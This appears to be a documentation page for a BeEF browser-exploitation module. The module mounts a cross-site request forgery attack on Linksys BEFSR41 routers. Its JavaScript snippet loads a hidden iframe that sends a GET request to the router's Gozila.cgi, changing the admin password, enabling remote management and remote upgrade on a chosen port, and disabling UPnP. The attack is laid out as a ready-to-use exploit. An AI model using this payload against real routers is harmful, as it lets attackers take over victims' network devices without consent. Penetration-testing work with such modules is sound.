## Summary

* **Objective**: enable remote administration and change the password on a Linksys BEFSR41 router
* **Authors**: Martin Barbella
* **Browsers**: All

* [Code](https://github.com/beefproject/beef/tree/master/modules/exploits/router/linksys_befsr41_csrf)

## Internal Working

Uses an invisible iframe with GET request to change config

```js
  var befsr41_iframe_<%= @command_id %> = beef.dom.createInvisibleIframe();
  befsr41_iframe_<%= @command_id %>.setAttribute('src', '<%= @base %>Gozila.cgi?PasswdModify=1&sysPasswd=<%= @password %>&sysPasswdConfirm=<%= @password %>&Remote_Upgrade=1&Remote_Management=1&RemotePort=<%= @port %>&UPnP_Work=0');
```

## Feedback
